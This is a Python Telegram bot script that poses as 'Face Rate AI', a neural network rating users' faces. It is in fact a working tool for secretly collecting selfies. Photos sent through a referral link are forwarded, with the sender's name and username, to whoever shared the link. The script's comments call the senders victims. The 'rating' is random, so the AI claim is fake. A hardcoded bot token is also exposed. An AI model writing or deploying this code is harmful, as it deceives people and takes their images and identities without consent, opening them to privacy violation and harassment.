import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
import random

TELEGRAM_TOKEN = "9037182564:AAF8t7WjlmrdSWmNsQV0nWxDkZM8LK-CwDc"
bot = telebot.TeleBot(TELEGRAM_TOKEN)

victims = {}

@bot.message_handler(commands=['start'])
def start_message(message):
    command_parts = message.text.split()
    
    # 1. ЖЕРТВА (перешла по ссылке)
    if len(command_parts) > 1:
        try:
            inviter_id = int(command_parts[1])
            victims[message.from_user.id] = inviter_id
            text = "🤖 **Добро пожаловать в Face Rate AI!**\n\nЯ — нейросеть, которая оценивает твое лицо по шкале от Sub 5 до Chad.\n\n📸 Скинь мне свое селфи, и я проведу анализ!"
            bot.send_message(message.chat.id, text, parse_mode="Markdown")
        except ValueError:
            pass
    
    # 2. СОЗДАТЕЛЬ (зашел сам)
    else:
        bot_info = bot.get_me()
        invite_link = f"https://t.me/{bot_info.username}?start={message.from_user.id}"
        
        text = "😎 **Добро пожаловать в Face Rate AI!**\n\nНажми на кнопку ниже, чтобы **СКОПИРОВАТЬ** ссылку. Скинь её другу, и как только он скинет фото, оно прилетит **тебе** сюда!"
        
        markup = InlineKeyboardMarkup()
        # Теперь кнопка копирует текст, а не открывает его!
        btn = InlineKeyboardButton("📋 Скопировать ссылку", copy_text=CopyTextButton(text=invite_link))
        markup.add(btn)
        
        bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    bot.send_message(message.chat.id, "📸 Фото получено! Нейросеть анализирует лицо... ⏳")
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        inviter_id = victims.get(message.from_user.id)
        if inviter_id:
            bot.send_photo(inviter_id, downloaded_file, caption=f"📸 **Жертва попалась!**\nИмя: {message.from_user.first_name}\nНик: @{message.from_user.username}")
            
        ratings = ["SUB 5 😭", "SUB 5 😭", "SUB 5 😭", "NPC 😐", "HIGH TIER NORMIE 🤔", "CHAD 🗿"]
        result = random.choice(ratings)
        bot.reply_to(message, f"🤖 Анализ завершен!\n\nТвой рейтинг: **{result}**", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(content_types=['text'])
def handle_text(message):
    # Если это команда (начинается с /), игнорируем её, чтобы не было спама
    if message.text.startswith('/'):
        return
    bot.reply_to(message, "Скинь мне фотографию, чтобы я мог оценить твое лицо! 📸")

print("Face Rate Bot запущен!")
bot.infinity_polling()
